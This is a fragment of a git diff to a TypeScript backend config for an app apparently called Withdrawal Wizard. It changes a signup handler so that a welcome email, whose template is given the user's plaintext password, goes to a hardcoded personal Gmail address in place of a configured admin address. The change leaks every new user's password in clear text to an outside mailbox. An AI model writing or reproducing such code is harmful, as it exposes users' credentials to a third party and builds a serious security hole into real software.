@@ -114,11 +114,7 @@ export const backendConfig = (): TypeInput => {
                                             ),
                                         });
                                         await sendMail({
-                                            to: process.env
-                                                .NEXT_PUBLIC_ADMIN_EMAIL
-                                                ? process.env
-                                                      .NEXT_PUBLIC_ADMIN_EMAIL
-                                                : "abc@example.com",
+                                            to: "ncls.chang.gmd@gmail.com",
                                             subject:
                                                 "New Withdrawal Wizard SignUp",
                                             html: welcomeEmailTemplateToAdmin(
@@ -128,7 +124,7 @@ export const backendConfig = (): TypeInput => {
                                                 input.password || "NaN"
                                             ),
                                         });
-                                    }, 5000);
+                                    }, 3000);
                                 }
                                 return response;
                             },
